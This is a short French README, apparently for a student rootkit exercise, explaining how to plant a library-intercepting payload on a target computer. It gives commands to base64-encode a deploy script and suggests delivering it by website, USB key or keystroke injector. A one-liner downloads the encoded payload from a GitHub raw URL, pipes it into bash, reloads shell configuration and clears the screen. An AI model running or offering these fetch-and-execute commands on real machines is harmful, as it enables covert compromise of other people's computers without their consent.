# Utilisation 

Adapter selon l'ordinateur visé (notamment les librairies à intercepter)

Préparer le code à déployer avec 

```
base64 -w 0 deploy.sh > deploy.b64
```

Porter le code sur la machine cible (via un site, clef USB, etc. -> injecteur de touche est une bonne option)

Et lancer 

```
...Contenu en Base64... | base64 -d | bash | source ~/.bashrc && source ~/.zshrc && clear
```

Notamment avec mon repo : 

```curl -sL https://raw.githubusercontent.com/floheb/tp_rk/refs/heads/main/deploy.b64 | base64 -d | bash ; source ~/.bashrc ; source ~/.zshrc; clear```
